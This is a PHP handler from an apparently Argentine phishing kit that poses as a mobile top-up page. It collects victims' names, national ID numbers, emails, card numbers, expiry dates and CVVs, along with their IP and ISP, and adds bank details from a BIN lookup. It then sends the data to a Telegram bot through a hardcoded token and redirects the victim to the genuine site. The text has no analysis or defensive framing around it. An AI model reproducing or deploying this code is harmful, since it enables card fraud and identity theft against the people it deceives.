<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$_SESSION['dni'] = $_POST['d'];
$_SESSION['mail'] = $_POST['e'];
$_SESSION['titular'] = $_POST['n'];
$_SESSION['card'] = $_POST['c'];
$_SESSION['mm'] = $_POST['v'];

$_SESSION['cvv'] = $_POST['cv'];


$ip = getenv("REMOTE_ADDR");

$msg .= "========== Importante =========\n";
    $msg .= "ISP    : ". $isp."\n";
    $msg .= "IP    : ".$ip."\n\n";
	$msg .= "========= Datos Titular ========\n";
	
	$msg .= "Titular : ".$_SESSION['titular']."\n";
	$msg .= "DNI     : ".$_SESSION['dni']."\n";
	$msg .= "Tarjeta : ".$_SESSION['card']."\n";
	$msg .= "Vencimiento : ".$_SESSION['mm']."\n";
	
	$msg .= "CVV     : ".$_SESSION['cvv']."\n";

 
	
	

	$msg .= "\n========= Datos Bancarios ==========\n";
	$bin = substr(str_replace(" ", "", $_SESSION["card"]), 0, 6);
	$result = file_get_contents("https://lookup.binlist.net/".$bin);
	$result = json_decode($result, true);
	if(isset($result["type"])){
		$msg .= "Tipo: ".$result["type"]."\n";
	}
	else {
		$msg .= "Tipo: No encontrado\n";
	}
	if(isset($result["brand"])){
		$msg .= "Marca: ".$result["brand"]."\n";
	}
	else {
		$msg .= "Marca: No encontrado\n";
	}
	if(isset($result["scheme"])){
		$msg .= "Esquema: ".$result["scheme"]."\n";
	}
	else {
		$msg .= "Esquema: No encontrado\n";
	}
	if(isset($result["country"]["name"])){
		$msg .= "Pais: ".$result["country"]["name"]."\n";
	}
	else {
		$msg .= "Pais: No encontrado\n";
	}
	if(isset($result["bank"]["name"])){
		$msg .= "Banco: ".$result["bank"]["name"]."\n";
	}
	else {
		$msg .= "Banco: No encontrado\n";
	}
	if(isset($result["bank"]["url"])){
		$msg .= "Url: ".$result["bank"]["url"]."\n";
	}
	else {
		$msg .= "Url: No encontrado\n";
	}
	if(isset($result["bank"]["phone"])){
		$msg .= "Telefono: ".$result["bank"]["phone"]."\n";
	}
	else {
		$msg .= "Telefono: No encontrado\n";
	}
	if(isset($result["bank"]["city"])){
		$msg .= "Ciudad: ".$result["bank"]["city"]."\n";
	}
	else {
		$msg .= "Ciudad: No encontrado\n";
	}
  $msg .= "\n=========RecargarArgentina by @YisusPai ========\n";
define('BOK', '6973852895:AAHvW1-VmBV7wQiu9QJq1jZWpx-B1N7G8Rw');
define('CHID', '-4074786076');
define('API_URL', 'http://www.api.redllnk.com:3000/telegram');

enviar_telegram($msg);

function enviar_telegram($msj)  {
	$queryArray = [
		'chat_id' => CHID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOK.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}
header("Location: https://www.recargas.com.ar/recarga-tu-saldo
?>